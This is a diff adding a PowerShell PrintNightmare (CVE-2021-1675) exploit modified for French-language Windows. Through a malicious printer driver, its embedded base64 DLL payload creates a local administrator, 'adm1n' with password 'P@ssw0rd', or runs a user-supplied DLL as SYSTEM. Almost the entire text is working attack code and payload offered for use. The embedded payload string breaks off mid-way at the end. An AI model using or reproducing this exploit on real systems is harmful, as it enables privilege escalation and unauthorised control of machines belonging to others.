@@ -1,0 +1,826 @@
+function Invoke-Nightmare
+{
+    <#
+        .SYNOPSIS
+        Exploits CVE-2021-1675 (PrintNightmare)
+
+        Authors:
+            Caleb Stewart - https://github.com/calebstewart
+            John Hammond - https://github.com/JohnHammond
+        URL: https://github.com/calebstewart/CVE-2021-1675
+
+        Modified for French Windows (Administrateurs group)
+        Embedded DLL compiled with MinGW-w64 for cross-platform compatibility.
+
+        .DESCRIPTION
+        Exploits CVE-2021-1675 (PrintNightmare) locally to add a new local administrator
+        user with a known password. Optionally, this can be used to execute your own
+        custom DLL to execute any other code as NT AUTHORITY\SYSTEM.
+
+        This version uses French "Administrateurs" group name by default.
+
+        .PARAMETER DriverName
+        The name of the new printer driver to add (default: "Totally Not Malicious")
+
+        .PARAMETER NewUser
+        The name of the new user to create when using the default DLL (default: "adm1n")
+
+        .PARAMETER NewPassword
+        The password for the new user when using the default DLL (default: "P@ssw0rd")
+
+        .PARAMETER DLL
+        The DLL to execute when loading the printer driver (default: a builtin payload which
+        creates the specified user, and adds the new user to the local administrators group).
+        For French Windows, compile nightmare-dll with "Administrateurs" and use this parameter.
+
+        .EXAMPLE
+        > Invoke-Nightmare
+        Adds a new local user named `adm1n` which is a member of the Administrateurs group (French Windows)
+
+        .EXAMPLE
+        > Invoke-Nightmare -NewUser "Huy" -NewPassword "Secure2024@!" -DriverName "Ngrokk"
+        Adds a new local user named `Huy` using a printer driver named `Ngrokk`
+
+        .EXAMPLE
+        > Invoke-Nightmare -DLL C:\path\to\custom.dll
+        Uses a custom DLL payload
+
+    #>
+    param (
+        [string]$DriverName = "Totally Not Malicious",
+        [string]$NewUser = "",
+        [string]$NewPassword = "",
+        [string]$DLL = ""
+    )
+
+    if ( $DLL -eq "" ){
+        Write-Host "[+] Using embedded French DLL (Administrateurs group)"
+        $nightmare_data = [byte[]](get_nightmare_dll)
+        $encoder = New-Object System.Text.UnicodeEncoding
+
+        # Offsets for MinGW-compiled French DLL (Administrateurs group)
+        # Username offset: 0x1c20, Password offset: 0x1e20
+        if ( $NewUser -ne "" ) {
+            $NewUserBytes = $encoder.GetBytes($NewUser)
+            [System.Buffer]::BlockCopy($NewUserBytes, 0, $nightmare_data, 0x1c20, $NewUserBytes.Length)
+            $nightmare_data[0x1c20+$NewUserBytes.Length] = 0
+            $nightmare_data[0x1c20+$NewUserBytes.Length+1] = 0
+        } else {
+            Write-Host "[+] using default new user: adm1n"
+        }
+
+        if ( $NewPassword -ne "" ) {
+            $NewPasswordBytes = $encoder.GetBytes($NewPassword)
+            [System.Buffer]::BlockCopy($NewPasswordBytes, 0, $nightmare_data, 0x1e20, $NewPasswordBytes.Length)
+            $nightmare_data[0x1e20+$NewPasswordBytes.Length] = 0
+            $nightmare_data[0x1e20+$NewPasswordBytes.Length+1] = 0
+        } else {
+            Write-Host "[+] using default new password: P@ssw0rd"
+        }
+
+        $DLL = [System.IO.Path]::GetTempPath() + "nightmare.dll"
+        [System.IO.File]::WriteAllBytes($DLL, $nightmare_data)
+        Write-Host "[+] created payload at $DLL"
+        $delete_me = $true
+    } else {
+        Write-Host "[+] using user-supplied payload at $DLL"
+        Write-Host "[*] custom DLL mode - NewUser and NewPassword arguments ignored"
+        $delete_me = $false
+    }
+
+    $Mod = New-InMemoryModule -ModuleName "A$(Get-Random)"
+
+    $FunctionDefinitions = @(
+      (func winspool.drv AddPrinterDriverEx ([bool]) @([string], [Uint32], [IntPtr], [Uint32]) -Charset Auto -SetLastError),
+      (func winspool.drv EnumPrinterDrivers([bool]) @( [string], [string], [Uint32], [IntPtr], [UInt32], [Uint32].MakeByRefType(), [Uint32].MakeByRefType()) -Charset Auto -SetLastError)
+    )
+
+    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Mod'
+
+    # Define custom structures for types created
+    $DRIVER_INFO_2 = struct $Mod DRIVER_INFO_2 @{
+        cVersion = field 0 Uint64;
+        pName = field 1 string -MarshalAs @("LPTStr");
+        pEnvironment = field 2 string -MarshalAs @("LPTStr");
+        pDriverPath = field 3 string -MarshalAs @("LPTStr");
+        pDataFile = field 4 string -MarshalAs @("LPTStr");
+        pConfigFile = field 5 string -MarshalAs @("LPTStr");
+    }
+
+    $winspool = $Types['winspool.drv']
+    $APD_COPY_ALL_FILES = 0x00000004
+
+    [Uint32]($cbNeeded) = 0
+    [Uint32]($cReturned) = 0
+
+    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, [IntPtr]::Zero, 0, [ref]$cbNeeded, [ref]$cReturned) ){
+        Write-Host "[!] EnumPrinterDrivers should fail!"
+        return
+    }
+
+    [IntPtr]$pAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([Uint32]($cbNeeded))
+
+    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, $pAddr, $cbNeeded, [ref]$cbNeeded, [ref]$cReturned) ){
+        $driver = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pAddr, [System.Type]$DRIVER_INFO_2)
+    } else {
+        Write-Host "[!] failed to get current driver list"
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)
+        return
+    }
+
+    Write-Host "[+] using pDriverPath = `"$($driver.pDriverPath)`""
+    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)
+
+    $driver_info = New-Object $DRIVER_INFO_2
+    $driver_info.cVersion = 3
+    $driver_info.pConfigFile = $DLL
+    $driver_info.pDataFile = $DLL
+    $driver_info.pDriverPath = $driver.pDriverPath
+    $driver_info.pEnvironment = "Windows x64"
+    $driver_info.pName = $DriverName
+
+    $pDriverInfo = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($driver_info))
+    [System.Runtime.InteropServices.Marshal]::StructureToPtr($driver_info, $pDriverInfo, $false)
+
+    if ( $winspool::AddPrinterDriverEx($null, 2, $pDriverInfo, $APD_COPY_ALL_FILES -bor 0x10 -bor 0x8000) ) {
+        if ( $delete_me ) {
+            if ( $NewUser -eq "" ) { $NewUser = "adm1n" }
+            if ( $NewPassword -eq "" ) { $NewPassword = "P@ssw0rd" }
+            Write-Host "[+] SUCCESS! Added user '$NewUser' with password '$NewPassword'"
+            Write-Host "[+] User added to 'Administrateurs' group (French Windows)"
+        } else {
+            Write-Host "[+] SUCCESS! Custom DLL has been loaded and executed!"
+        }
+    } else {
+        Write-Error "[!] AddPrinterDriverEx failed - exploit unsuccessful"
+    }
+
+    if ( $delete_me ) {
+        Write-Host "[+] cleaning up: deleting payload from $DLL"
+        Remove-Item -Force $DLL
+    }
+}
+
+# ============================================================================
+# EMBEDDED DLL PAYLOAD - FRENCH VERSION
+# ============================================================================
+# This embedded DLL uses French "Administrateurs" group name!
+# Compiled with MinGW-w64 for cross-platform compatibility.
+# 
+# String offsets in this DLL:
+#   - Username (adm1n):    0x1c20
+#   - Password (P@ssw0rd): 0x1e20
+# ============================================================================
+function get_nightmare_dll
+{
+    # CURRENT: French Windows DLL (uses "Administrateurs" group)
+    $nightmare_data = [System.Convert]::FromBase64String("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